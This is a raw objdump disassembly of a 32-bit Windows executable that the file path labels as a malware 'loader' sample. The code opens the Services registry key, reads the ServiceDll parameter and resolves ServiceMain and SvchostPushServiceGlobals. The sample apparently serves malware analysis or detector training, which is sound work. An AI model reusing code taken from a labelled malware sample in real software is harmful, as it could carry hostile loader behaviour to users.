
malware_samples/loader/543323b7ace23bcf3801ca19b14491fea9ac48ad5f5e94ed90bb3b576a52ebcc.exe:     file format pei-i386


Disassembly of section .text:

01001000 <.text>:
 1001000:	c8 6f dd 77          	enter  $0xdd6f,$0x77
 1001004:	b3 77                	mov    $0x77,%bl
 1001006:	dd 77 e5             	fnsave -0x1b(%edi)
 1001009:	d1 df                	rcr    $1,%edi
 100100b:	77 4e                	ja     0x100105b
 100100d:	ce                   	into
 100100e:	df 77 26             	fbstp  0x26(%edi)
 1001011:	ce                   	into
 1001012:	df 77 8e             	fbstp  -0x72(%edi)
 1001015:	77 dd                	ja     0x1000ff4
 1001017:	77 76                	ja     0x100108f
 1001019:	7b dd                	jnp    0x1000ff8
 100101b:	77 53                	ja     0x1001070
 100101d:	77 dd                	ja     0x1000ffc
 100101f:	77 3d                	ja     0x100105e
 1001021:	7b dd                	jnp    0x1001000
 1001023:	77 93                	ja     0x1000fb8
 1001025:	b1 de                	mov    $0xde,%cl
 1001027:	77 8f                	ja     0x1000fb8
 1001029:	bb de 77 f0 6b       	mov    $0x6bf077de,%ebx
 100102e:	dd 77 78             	fnsave 0x78(%edi)
 1001031:	6a dd                	push   $0xffffffdd
 1001033:	77 dd                	ja     0x1001012
 1001035:	b4 de                	mov    $0xde,%ah
 1001037:	77 00                	ja     0x1001039
 1001039:	00 00                	add    %al,(%eax)
 100103b:	00 3d 04 91 7c 31    	add    %bh,0x317c9104
 1001041:	03 91 7c c7 a0 80    	add    -0x7f5f3884(%ecx),%edx
 1001047:	7c 39                	jl     0x1001082
 1001049:	9a 80 7c 5d 99 80 7c 	lcall  $0x7c80,$0x995d7c80
 1001050:	0d e0 80 7c 19       	or     $0x197c80e0,%eax
 1001055:	99                   	cltd
 1001056:	80 7c 28 ac 80       	cmpb   $0x80,-0x54(%eax,%ebp,1)
 100105b:	7c f1                	jl     0x100104e
 100105d:	1a 80 7c ed 10 90    	sbb    -0x6fef1284(%eax),%al
 1001063:	7c d4                	jl     0x1001039
 1001065:	05 91 7c 05 10       	add    $0x10057c91,%eax
 100106a:	90                   	nop
 100106b:	7c c4                	jl     0x1001031
 100106d:	ce                   	into
 100106e:	80 7c 66 aa 80       	cmpb   $0x80,-0x56(%esi,%eiz,2)
 1001073:	7c ec                	jl     0x1001061
 1001075:	b8 80 7c b1 df       	mov    $0xdfb17c80,%eax
 100107a:	81 7c 23 a8 80 7c a2 	cmpl   $0xcaa27c80,-0x58(%ebx,%eiz,1)
 1001081:	ca 
 1001082:	81 7c fb 6c 81 7c a1 	cmpl   $0x9fa17c81,0x6c(%ebx,%edi,8)
 1001089:	9f 
 100108a:	80 7c 49 aa 80       	cmpb   $0x80,-0x56(%ecx,%ecx,2)
 100108f:	7c 97                	jl     0x1001028
 1001091:	aa                   	stos   %al,%es:(%edi)
 1001092:	80 7c 86 03 81       	cmpb   $0x81,0x3(%esi,%eax,4)
 1001097:	7c 7d                	jl     0x1001116
 1001099:	5c                   	pop    %esp
 100109a:	82 7c c6 97 80       	cmpb   $0x80,-0x69(%esi,%eax,8)
 100109f:	7c 77                	jl     0x1001118
 10010a1:	1d 80 7c 17 a4       	sbb    $0xa4177c80,%eax
 10010a6:	80 7c ac 92 80       	cmpb   $0x80,-0x6e(%esp,%ebp,4)
 10010ab:	7c 37                	jl     0x10010e4
 10010ad:	97                   	xchg   %eax,%edi
 10010ae:	80 7c 4e 99 80       	cmpb   $0x80,-0x67(%esi,%ecx,2)
 10010b3:	7c e5                	jl     0x100109a
 10010b5:	17                   	pop    %ss
 10010b6:	80 7c 16 1e 80       	cmpb   $0x80,0x1e(%esi,%edx,1)
 10010bb:	7c 8a                	jl     0x1001047
 10010bd:	2b 86 7c bd 99 80    	sub    -0x7f664284(%esi),%eax
 10010c3:	7c 59                	jl     0x100111e
 10010c5:	a8 80                	test   $0x80,%al
 10010c7:	7c 1d                	jl     0x10010e6
 10010c9:	db 87 7c 00 00 00    	fildl  0x7c(%edi)
 10010cf:	00 41 e1             	add    %al,-0x1f(%ecx)
 10010d2:	90                   	nop
 10010d3:	7c 3d                	jl     0x1001112
 10010d5:	04 91                	add    $0x91,%al
 10010d7:	7c 3c                	jl     0x1001115
 10010d9:	dd 90 7c 59 a3 91    	fstl   -0x6e5ca684(%eax)
 10010df:	7c 73                	jl     0x1001154
 10010e1:	34 91                	xor    $0x91,%al
 10010e3:	7c d4                	jl     0x10010b9
 10010e5:	05 91 7c b2 77       	add    $0x77b27c91,%eax
 10010ea:	91                   	xchg   %eax,%ecx
 10010eb:	7c d6                	jl     0x10010c3
 10010ed:	12 90 7c bd a4 91    	adc    -0x6e5b4284(%eax),%dl
 10010f3:	7c cc                	jl     0x10010c1
 10010f5:	a9 92 7c a0 a4       	test   $0xa4a07c92,%eax
 10010fa:	91                   	xchg   %eax,%ecx
 10010fb:	7c 86                	jl     0x1001083
 10010fd:	d5 90                	aad    $0x90
 10010ff:	7c 20                	jl     0x1001121
 1001101:	7f 92                	jg     0x1001095
 1001103:	7c 39                	jl     0x100113e
 1001105:	81 92 7c 21 e1 92 7c 	adcl   $0x938d697c,-0x6d1ede84(%edx)
 100110c:	69 8d 93 
 100110f:	7c 49                	jl     0x100115a
 1001111:	08 91 7c 5a 03 91    	or     %dl,-0x6efca584(%ecx)
 1001117:	7c ef                	jl     0x1001108
 1001119:	60                   	pusha
 100111a:	96                   	xchg   %eax,%esi
 100111b:	7c 82                	jl     0x100109f
 100111d:	36 91                	ss xchg %eax,%ecx
 100111f:	7c 00                	jl     0x1001121
 1001121:	00 00                	add    %al,(%eax)
 1001123:	00 e1                	add    %ah,%cl
 1001125:	97                   	xchg   %eax,%edi
 1001126:	eb 77                	jmp    0x100119f
 1001128:	2b b6 e9 77 d7 bd    	sub    -0x42288817(%esi),%esi
 100112e:	e9 77 94 d3 e9       	jmp    0xead3a5aa
 1001133:	77 f3                	ja     0x1001128
 1001135:	b1 e9                	mov    $0xe9,%cl
 1001137:	77 3d                	ja     0x1001176
 1001139:	11 ea                	adc    %ebp,%edx
 100113b:	77 e5                	ja     0x1001122
 100113d:	b2 e9                	mov    $0xe9,%dl
 100113f:	77 0a                	ja     0x100114b
 1001141:	2d e8 77 80 b6       	sub    $0xb68077e8,%eax
 1001146:	e9 77 00 00 00       	jmp    0x10011c2
 100114b:	00 8d 45 f0 50 8d    	add    %cl,-0x72af0fbb(%ebp)
 1001151:	45                   	inc    %ebp
 1001152:	fc                   	cld
 1001153:	50                   	push   %eax
 1001154:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1001157:	50                   	push   %eax
 1001158:	a1 38 40 00 01       	mov    0x1004038,%eax
 100115d:	8d 34 b6             	lea    (%esi,%esi,4),%esi
 1001160:	c1 e6 02             	shl    $0x2,%esi
 1001163:	03 c6                	add    %esi,%eax
 1001165:	50                   	push   %eax
 1001166:	e8 66 01 00 00       	call   0x10012d1
 100116b:	33 c0                	xor    %eax,%eax
 100116d:	39 45 f8             	cmp    %eax,-0x8(%ebp)
 1001170:	74 09                	je     0x100117b
 1001172:	39 45 fc             	cmp    %eax,-0x4(%ebp)
 1001175:	0f 85 6e 06 00 00    	jne    0x10017e9
 100117b:	8b 45 0c             	mov    0xc(%ebp),%eax
 100117e:	8b 38                	mov    (%eax),%edi
 1001180:	a1 38 40 00 01       	mov    0x1004038,%eax
 1001185:	03 f0                	add    %eax,%esi
 1001187:	33 c0                	xor    %eax,%eax
 1001189:	39 45 fc             	cmp    %eax,-0x4(%ebp)
 100118c:	0f 85 6d 06 00 00    	jne    0x10017ff
 1001192:	39 45 f8             	cmp    %eax,-0x8(%ebp)
 1001195:	74 08                	je     0x100119f
 1001197:	39 45 fc             	cmp    %eax,-0x4(%ebp)
 100119a:	75 03                	jne    0x100119f
 100119c:	ff 46 0c             	incl   0xc(%esi)
 100119f:	53                   	push   %ebx
 10011a0:	ff 15 60 10 00 01    	call   *0x1001060
 10011a6:	33 db                	xor    %ebx,%ebx
 10011a8:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 10011ab:	0f 85 19 06 00 00    	jne    0x10017ca
 10011b1:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
 10011b4:	0f 84 61 06 00 00    	je     0x100181b
 10011ba:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 10011bd:	0f 85 58 06 00 00    	jne    0x100181b
 10011c3:	ff 75 0c             	push   0xc(%ebp)
 10011c6:	ff 75 08             	push   0x8(%ebp)
 10011c9:	ff 55 f8             	call   *-0x8(%ebp)
 10011cc:	56                   	push   %esi
 10011cd:	e8 50 05 00 00       	call   0x1001722
 10011d2:	5f                   	pop    %edi
 10011d3:	5e                   	pop    %esi
 10011d4:	5b                   	pop    %ebx
 10011d5:	c9                   	leave
 10011d6:	c2 08 00             	ret    $0x8
 10011d9:	90                   	nop
 10011da:	90                   	nop
 10011db:	90                   	nop
 10011dc:	90                   	nop
 10011dd:	90                   	nop
 10011de:	8b ff                	mov    %edi,%edi
 10011e0:	55                   	push   %ebp
 10011e1:	8b ec                	mov    %esp,%ebp
 10011e3:	51                   	push   %ecx
 10011e4:	51                   	push   %ecx
 10011e5:	56                   	push   %esi
 10011e6:	8b 35 30 10 00 01    	mov    0x1001030,%esi
 10011ec:	57                   	push   %edi
 10011ed:	8d 45 f8             	lea    -0x8(%ebp),%eax
 10011f0:	50                   	push   %eax
 10011f1:	bf 19 00 02 00       	mov    $0x20019,%edi
 10011f6:	57                   	push   %edi
 10011f7:	6a 00                	push   $0x0
 10011f9:	68 68 12 00 01       	push   $0x1001268
 10011fe:	68 02 00 00 80       	push   $0x80000002
 1001203:	ff d6                	call   *%esi
 1001205:	85 c0                	test   %eax,%eax
 1001207:	89 45 fc             	mov    %eax,-0x4(%ebp)
 100120a:	75 3b                	jne    0x1001247
 100120c:	53                   	push   %ebx
 100120d:	8d 45 08             	lea    0x8(%ebp),%eax
 1001210:	50                   	push   %eax
 1001211:	57                   	push   %edi
 1001212:	6a 00                	push   $0x0
 1001214:	ff 75 08             	push   0x8(%ebp)
 1001217:	ff 75 f8             	push   -0x8(%ebp)
 100121a:	ff d6                	call   *%esi
 100121c:	85 c0                	test   %eax,%eax
 100121e:	8b 1d 2c 10 00 01    	mov    0x100102c,%ebx
 1001224:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1001227:	75 18                	jne    0x1001241
 1001229:	ff 75 0c             	push   0xc(%ebp)
 100122c:	57                   	push   %edi
 100122d:	6a 00                	push   $0x0
 100122f:	68 50 12 00 01       	push   $0x1001250
 1001234:	ff 75 08             	push   0x8(%ebp)
 1001237:	ff d6                	call   *%esi
 1001239:	ff 75 08             	push   0x8(%ebp)
 100123c:	89 45 fc             	mov    %eax,-0x4(%ebp)
 100123f:	ff d3                	call   *%ebx
 1001241:	ff 75 f8             	push   -0x8(%ebp)
 1001244:	ff d3                	call   *%ebx
 1001246:	5b                   	pop    %ebx
 1001247:	8b 45 fc             	mov    -0x4(%ebp),%eax
 100124a:	5f                   	pop    %edi
 100124b:	5e                   	pop    %esi
 100124c:	c9                   	leave
 100124d:	c2 08 00             	ret    $0x8
 1001250:	50                   	push   %eax
 1001251:	00 61 00             	add    %ah,0x0(%ecx)
 1001254:	72 00                	jb     0x1001256
 1001256:	61                   	popa
 1001257:	00 6d 00             	add    %ch,0x0(%ebp)
 100125a:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
 100125f:	00 72 00             	add    %dh,0x0(%edx)
 1001262:	73 00                	jae    0x1001264
 1001264:	00 00                	add    %al,(%eax)
 1001266:	90                   	nop
 1001267:	90                   	nop
 1001268:	53                   	push   %ebx
 1001269:	00 79 00             	add    %bh,0x0(%ecx)
 100126c:	73 00                	jae    0x100126e
 100126e:	74 00                	je     0x1001270
 1001270:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
 1001274:	5c                   	pop    %esp
 1001275:	00 43 00             	add    %al,0x0(%ebx)
 1001278:	75 00                	jne    0x100127a
 100127a:	72 00                	jb     0x100127c
 100127c:	72 00                	jb     0x100127e
 100127e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
 1001282:	74 00                	je     0x1001284
 1001284:	43                   	inc    %ebx
 1001285:	00 6f 00             	add    %ch,0x0(%edi)
 1001288:	6e                   	outsb  %ds:(%esi),(%dx)
 1001289:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
 100128d:	00 6f 00             	add    %ch,0x0(%edi)
 1001290:	6c                   	insb   (%dx),%es:(%edi)
 1001291:	00 53 00             	add    %dl,0x0(%ebx)
 1001294:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
 1001299:	00 53 00             	add    %dl,0x0(%ebx)
 100129c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 10012a0:	76 00                	jbe    0x10012a2
 10012a2:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
 10012a8:	73 00                	jae    0x10012aa
 10012aa:	00 00                	add    %al,(%eax)
 10012ac:	90                   	nop
 10012ad:	90                   	nop
 10012ae:	90                   	nop
 10012af:	90                   	nop
 10012b0:	90                   	nop
 10012b1:	8b ff                	mov    %edi,%edi
 10012b3:	55                   	push   %ebp
 10012b4:	8b ec                	mov    %esp,%ebp
 10012b6:	ff 75 0c             	push   0xc(%ebp)
 10012b9:	ff 75 08             	push   0x8(%ebp)
 10012bc:	ff 35 3c 40 00 01    	push   0x100403c
 10012c2:	ff 15 64 10 00 01    	call   *0x1001064
 10012c8:	5d                   	pop    %ebp
 10012c9:	c2 08 00             	ret    $0x8
 10012cc:	90                   	nop
 10012cd:	90                   	nop
 10012ce:	90                   	nop
 10012cf:	90                   	nop
 10012d0:	90                   	nop
 10012d1:	8b ff                	mov    %edi,%edi
 10012d3:	55                   	push   %ebp
 10012d4:	8b ec                	mov    %esp,%ebp
 10012d6:	81 ec 2c 04 00 00    	sub    $0x42c,%esp
 10012dc:	a1 44 40 00 01       	mov    0x1004044,%eax
 10012e1:	53                   	push   %ebx
 10012e2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 10012e5:	56                   	push   %esi
 10012e6:	8b 75 08             	mov    0x8(%ebp),%esi
 10012e9:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10012ec:	8b 45 10             	mov    0x10(%ebp),%eax
 10012ef:	57                   	push   %edi
 10012f0:	8b 7d 14             	mov    0x14(%ebp),%edi
 10012f3:	83 27 00             	andl   $0x0,(%edi)
 10012f6:	89 85 d4 fb ff ff    	mov    %eax,-0x42c(%ebp)
 10012fc:	8b 46 04             	mov    0x4(%esi),%eax
 10012ff:	85 c0                	test   %eax,%eax
 1001301:	0f 85 dd 00 00 00    	jne    0x10013e4
 1001307:	8d 85 e0 fb ff ff    	lea    -0x420(%ebp),%eax
 100130d:	50                   	push   %eax
 100130e:	ff 36                	push   (%esi)
 1001310:	e8 c9 fe ff ff       	call   0x10011de
 1001315:	85 c0                	test   %eax,%eax
 1001317:	0f 85 07 01 00 00    	jne    0x1001424
 100131d:	8d 85 d8 fb ff ff    	lea    -0x428(%ebp),%eax
 1001323:	50                   	push   %eax
 1001324:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
 100132a:	50                   	push   %eax
 100132b:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
 1001331:	50                   	push   %eax
 1001332:	6a 00                	push   $0x0
 1001334:	68 68 14 00 01       	push   $0x1001468
 1001339:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
 100133f:	c7 85 d8 fb ff ff 0a 	movl   $0x20a,-0x428(%ebp)
 1001346:	02 00 00 
 1001349:	ff 15 00 10 00 01    	call   *0x1001000
 100134f:	85 c0                	test   %eax,%eax
 1001351:	0f 85 c9 00 00 00    	jne    0x1001420
 1001357:	6a 02                	push   $0x2
 1001359:	58                   	pop    %eax
 100135a:	39 85 dc fb ff ff    	cmp    %eax,-0x424(%ebp)
 1001360:	0f 85 ba 00 00 00    	jne    0x1001420
 1001366:	66 83 bd e4 fb ff ff 	cmpw   $0x0,-0x41c(%ebp)
 100136d:	00 
 100136e:	0f 84 ac 00 00 00    	je     0x1001420
 1001374:	68 04 01 00 00       	push   $0x104
 1001379:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
 100137f:	50                   	push   %eax
 1001380:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
 1001386:	50                   	push   %eax
 1001387:	ff 15 78 10 00 01    	call   *0x1001078
 100138d:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
 1001393:	50                   	push   %eax
 1001394:	e8 59 01 00 00       	call   0x10014f2
 1001399:	56                   	push   %esi
 100139a:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
 10013a0:	50                   	push   %eax
 10013a1:	e8 24 02 00 00       	call   0x10015ca
 10013a6:	85 c0                	test   %eax,%eax
 10013a8:	75 0e                	jne    0x10013b8
 10013aa:	57                   	push   %edi
 10013ab:	56                   	push   %esi
 10013ac:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
 10013b2:	50                   	push   %eax
 10013b3:	e8 76 02 00 00       	call   0x100162e
 10013b8:	89 46 04             	mov    %eax,0x4(%esi)
 10013bb:	8d 46 08             	lea    0x8(%esi),%eax
 10013be:	50                   	push   %eax
 10013bf:	6a 01                	push   $0x1
 10013c1:	68 50 14 00 01       	push   $0x1001450
 10013c6:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
 10013cc:	e8 c1 01 00 00       	call   0x1001592
 10013d1:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
 10013d7:	ff 15 2c 10 00 01    	call   *0x100102c
 10013dd:	8b 46 04             	mov    0x4(%esi),%eax
 10013e0:	85 c0                	test   %eax,%eax
 10013e2:	74 2d                	je     0x1001411
 10013e4:	8b 4e 08             	mov    0x8(%esi),%ecx
 10013e7:	85 c9                	test   %ecx,%ecx
 10013e9:	75 05                	jne    0x10013f0
 10013eb:	b9 44 14 00 01       	mov    $0x1001444,%ecx
 10013f0:	57                   	push   %edi
 10013f1:	51                   	push   %ecx
 10013f2:	50                   	push   %eax
 10013f3:	e8 8b 00 00 00       	call   0x1001483
 10013f8:	6a 00                	push   $0x0
 10013fa:	68 28 14 00 01       	push   $0x1001428
 10013ff:	89 03                	mov    %eax,(%ebx)
 1001401:	ff 76 04             	push   0x4(%esi)
 1001404:	e8 7a 00 00 00       	call   0x1001483
 1001409:	8b 8d d4 fb ff ff    	mov    -0x42c(%ebp),%ecx
 100140f:	89 01                	mov    %eax,(%ecx)
 1001411:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1001414:	5f                   	pop    %edi
 1001415:	5e                   	pop    %esi
 1001416:	5b                   	pop    %ebx
 1001417:	e8 ac 00 00 00       	call   0x10014c8
 100141c:	c9                   	leave
 100141d:	c2 10 00             	ret    $0x10
 1001420:	89 07                	mov    %eax,(%edi)
 1001422:	eb ad                	jmp    0x10013d1
 1001424:	89 07                	mov    %eax,(%edi)
 1001426:	eb b5                	jmp    0x10013dd
 1001428:	53                   	push   %ebx
 1001429:	76 63                	jbe    0x100148e
 100142b:	68 6f 73 74 50       	push   $0x5074736f
 1001430:	75 73                	jne    0x10014a5
 1001432:	68 53 65 72 76       	push   $0x76726553
 1001437:	69 63 65 47 6c 6f 62 	imul   $0x626f6c47,0x65(%ebx),%esp
 100143e:	61                   	popa
 100143f:	6c                   	insb   (%dx),%es:(%edi)
 1001440:	73 00                	jae    0x1001442
 1001442:	90                   	nop
 1001443:	90                   	nop
 1001444:	53                   	push   %ebx
 1001445:	65 72 76             	gs jb  0x10014be
 1001448:	69 63 65 4d 61 69 6e 	imul   $0x6e69614d,0x65(%ebx),%esp
 100144f:	00 53 00             	add    %dl,0x0(%ebx)
 1001452:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 1001456:	76 00                	jbe    0x1001458
 1001458:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
 100145e:	4d                   	dec    %ebp
 100145f:	00 61 00             	add    %ah,0x0(%ecx)
 1001462:	69 00 6e 00 00 00    	imul   $0x6e,(%eax),%eax
 1001468:	53                   	push   %ebx
 1001469:	00 65 00             	add    %ah,0x0(%ebp)
 100146c:	72 00                	jb     0x100146e
 100146e:	76 00                	jbe    0x1001470
 1001470:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
 1001476:	44                   	inc    %esp
 1001477:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
 100147b:	00 00                	add    %al,(%eax)
 100147d:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
 1001483:	8b ff                	mov    %edi,%edi
 1001485:	55                   	push   %ebp
 1001486:	8b ec                	mov    %esp,%ebp
 1001488:	56                   	push   %esi
 1001489:	8b 75 08             	mov    0x8(%ebp),%esi
 100148c:	8b 46 08             	mov    0x8(%esi),%eax
 100148f:	85 c0                	test   %eax,%eax
 1001491:	75 17                	jne    0x10014aa
 1001493:	6a 08                	push   $0x8
 1001495:	50                   	push   %eax
 1001496:	ff 76 0c             	push   0xc(%esi)
 1001499:	ff 15 5c 10 00 01    	call   *0x100105c
 100149f:	85 c0                	test   %eax,%eax
 10014a1:	0f 84 48 15 00 00    	je     0x10029ef
 10014a7:	89 46 08             	mov    %eax,0x8(%esi)
 10014aa:	57                   	push   %edi
 10014ab:	ff 75 0c             	push   0xc(%ebp)
 10014ae:	50                   	push   %eax
 10014af:	ff 15 58 10 00 01    	call   *0x1001058
 10014b5:	8b f8                	mov    %eax,%edi
 10014b7:	85 ff                	test   %edi,%edi
 10014b9:	74 26                	je     0x10014e1
 10014bb:	8b c7                	mov    %edi,%eax
 10014bd:	5f                   	pop    %edi
 10014be:	5e                   	pop    %esi
 10014bf:	5d                   	pop    %ebp
 10014c0:	c2 0c 00             	ret    $0xc
 10014c3:	90                   	nop
 10014c4:	90                   	nop
 10014c5:	90                   	nop
 10014c6:	90                   	nop
 10014c7:	90                   	nop
 10014c8:	3b 0d 44 40 00 01    	cmp    0x1004044,%ecx
 10014ce:	0f 85 c6 1b 00 00    	jne    0x100309a
 10014d4:	f7 c1 00 00 ff ff    	test   $0xffff0000,%ecx
 10014da:	0f 85 ba 1b 00 00    	jne    0x100309a
 10014e0:	c3                   	ret
 10014e1:	8b 75 10             	mov    0x10(%ebp),%esi
 10014e4:	85 f6                	test   %esi,%esi
 10014e6:	74 d3                	je     0x10014bb
 10014e8:	e9 f5 14 00 00       	jmp    0x10029e2
 10014ed:	90                   	nop
 10014ee:	90                   	nop
 10014ef:	90                   	nop
 10014f0:	90                   	nop
 10014f1:	90                   	nop
 10014f2:	8b ff                	mov    %edi,%edi
 10014f4:	55                   	push   %ebp
 10014f5:	8b ec                	mov    %esp,%ebp
 10014f7:	56                   	push   %esi
 10014f8:	8b 75 08             	mov    0x8(%ebp),%esi
 10014fb:	85 f6                	test   %esi,%esi
 10014fd:	74 1d                	je     0x100151c
 10014ff:	56                   	push   %esi
 1001500:	ff 15 14 11 00 01    	call   *0x1001114
 1001506:	59                   	pop    %ecx
 1001507:	40                   	inc    %eax
 1001508:	50                   	push   %eax
 1001509:	56                   	push   %esi
 100150a:	50                   	push   %eax
 100150b:	56                   	push   %esi
 100150c:	68 00 01 00 00       	push   $0x100
 1001511:	68 00 04 00 00       	push   $0x400
 1001516:	ff 15 6c 10 00 01    	call   *0x100106c
 100151c:	5e                   	pop    %esi
 100151d:	5d                   	pop    %ebp
 100151e:	c2 04 00             	ret    $0x4
 1001521:	90                   	nop
 1001522:	90                   	nop
 1001523:	90                   	nop
 1001524:	90                   	nop
 1001525:	90                   	nop
 1001526:	8b ff                	mov    %edi,%edi
 1001528:	55                   	push   %ebp
 1001529:	8b ec                	mov    %esp,%ebp
 100152b:	8d 45 14             	lea    0x14(%ebp),%eax
 100152e:	50                   	push   %eax
 100152f:	ff 75 14             	push   0x14(%ebp)
 1001532:	ff 75 10             	push   0x10(%ebp)
 1001535:	ff 75 0c             	push   0xc(%ebp)
 1001538:	ff 75 08             	push   0x8(%ebp)
 100153b:	e8 09 00 00 00       	call   0x1001549
 1001540:	5d                   	pop    %ebp
 1001541:	c2 10 00             	ret    $0x10
 1001544:	90                   	nop
 1001545:	90                   	nop
 1001546:	90                   	nop
 1001547:	90                   	nop
 1001548:	90                   	nop
 1001549:	8b ff                	mov    %edi,%edi
 100154b:	55                   	push   %ebp
 100154c:	8b ec                	mov    %esp,%ebp
 100154e:	51                   	push   %ecx
 100154f:	51                   	push   %ecx
 1001550:	8b 45 14             	mov    0x14(%ebp),%eax
 1001553:	53                   	push   %ebx
 1001554:	56                   	push   %esi
 1001555:	8b 35 00 10 00 01    	mov    0x1001000,%esi
 100155b:	57                   	push   %edi
 100155c:	33 ff                	xor    %edi,%edi
 100155e:	89 38                	mov    %edi,(%eax)
 1001560:	8b 45 18             	mov    0x18(%ebp),%eax
 1001563:	89 38                	mov    %edi,(%eax)
 1001565:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1001568:	50                   	push   %eax
 1001569:	57                   	push   %edi
 100156a:	8d 45 f8             	lea    -0x8(%ebp),%eax
 100156d:	50                   	push   %eax
 100156e:	57                   	push   %edi
 100156f:	ff 75 0c             	push   0xc(%ebp)
 1001572:	89 7d fc             	mov    %edi,-0x4(%ebp)
 1001575:	ff 75 08             	push   0x8(%ebp)
 1001578:	ff d6                	call   *%esi
 100157a:	8b d8                	mov    %eax,%ebx
 100157c:	3b df                	cmp    %edi,%ebx
 100157e:	0f 84 c7 02 00 00    	je     0x100184b
 1001584:	5f                   	pop    %edi
 1001585:	5e                   	pop    %esi
 1001586:	8b c3                	mov    %ebx,%eax
 1001588:	5b                   	pop    %ebx
 1001589:	c9                   	leave
 100158a:	c2 14 00             	ret    $0x14
 100158d:	90                   	nop
 100158e:	90                   	nop
 100158f:	90                   	nop
 1001590:	90                   	nop
 1001591:	90                   	nop
 1001592:	8b ff                	mov    %edi,%edi
 1001594:	55                   	push   %ebp
 1001595:	8b ec                	mov    %esp,%ebp
 1001597:	51                   	push   %ecx
 1001598:	8b 45 14             	mov    0x14(%ebp),%eax
 100159b:	56                   	push   %esi
 100159c:	33 f6                	xor    %esi,%esi
 100159e:	89 30                	mov    %esi,(%eax)
 10015a0:	8d 45 10             	lea    0x10(%ebp),%eax
 10015a3:	50                   	push   %eax
 10015a4:	ff 75 10             	push   0x10(%ebp)
 10015a7:	ff 75 0c             	push   0xc(%ebp)
 10015aa:	ff 75 08             	push   0x8(%ebp)
 10015ad:	e8 74 ff ff ff       	call   0x1001526
 10015b2:	3b c6                	cmp    %esi,%eax
 10015b4:	89 45 0c             	mov    %eax,0xc(%ebp)
 10015b7:	0f 84 13 03 00 00    	je     0x10018d0
 10015bd:	8b 45 0c             	mov    0xc(%ebp),%eax
 10015c0:	5e                   	pop    %esi
 10015c1:	c9                   	leave
 10015c2:	c2 10 00             	ret    $0x10
 10015c5:	90                   	nop
 10015c6:	90                   	nop
 10015c7:	90                   	nop
 10015c8:	90                   	nop
 10015c9:	90                   	nop
 10015ca:	8b ff                	mov    %edi,%edi
 10015cc:	55                   	push   %ebp
 10015cd:	8b ec                	mov    %esp,%ebp
 10015cf:	51                   	push   %ecx
 10015d0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 10015d4:	56                   	push   %esi
 10015d5:	57                   	push   %edi
 10015d6:	68 20 40 00 01       	push   $0x1004020
 10015db:	ff 15 68 10 00 01    	call   *0x1001068
 10015e1:	8b 35 48 40 00 01    	mov    0x1004048,%esi
 10015e7:	bf 48 40 00 01       	mov    $0x1004048,%edi
 10015ec:	3b f7                	cmp    %edi,%esi
 10015ee:	74 25                	je     0x1001615
 10015f0:	53                   	push   %ebx
 10015f1:	8b 1d c4 10 00 01    	mov    0x10010c4,%ebx
 10015f7:	ff 75 08             	push   0x8(%ebp)
 10015fa:	89 75 fc             	mov    %esi,-0x4(%ebp)
 10015fd:	ff 76 0c             	push   0xc(%esi)
 1001600:	ff d3                	call   *%ebx
 1001602:	85 c0                	test   %eax,%eax
 1001604:	0f 84 32 03 00 00    	je     0x100193c
 100160a:	8b 36                	mov    (%esi),%esi
 100160c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1001610:	3b f7                	cmp    %edi,%esi
 1001612:	75 e3                	jne    0x10015f7
 1001614:	5b                   	pop    %ebx
 1001615:	68 20 40 00 01       	push   $0x1004020
 100161a:	ff 15 60 10 00 01    	call   *0x1001060
 1001620:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1001623:	5f                   	pop    %edi
 1001624:	5e                   	pop    %esi
 1001625:	c9                   	leave
 1001626:	c2 08 00             	ret    $0x8
 1001629:	90                   	nop
 100162a:	90                   	nop
 100162b:	90                   	nop
 100162c:	90                   	nop
 100162d:	90                   	nop
 100162e:	8b ff                	mov    %edi,%edi
 1001630:	55                   	push   %ebp
 1001631:	8b ec                	mov    %esp,%ebp
 1001633:	56                   	push   %esi
 1001634:	57                   	push   %edi
 1001635:	ff 75 08             	push   0x8(%ebp)
 1001638:	ff 15 48 10 00 01    	call   *0x1001048
 100163e:	8d 44 00 16          	lea    0x16(%eax,%eax,1),%eax
 1001642:	50                   	push   %eax
 1001643:	6a 08                	push   $0x8
 1001645:	5f                   	pop    %edi
 1001646:	57                   	push   %edi
 1001647:	e8 65 fc ff ff       	call   0x10012b1
 100164c:	8b f0                	mov    %eax,%esi
 100164e:	85 f6                	test   %esi,%esi
 1001650:	74 47                	je     0x1001699
 1001652:	ff 75 08             	push   0x8(%ebp)
 1001655:	8d 46 14             	lea    0x14(%esi),%eax
 1001658:	50                   	push   %eax
 1001659:	89 46 0c             	mov    %eax,0xc(%esi)
 100165c:	ff 15 74 10 00 01    	call   *0x1001074
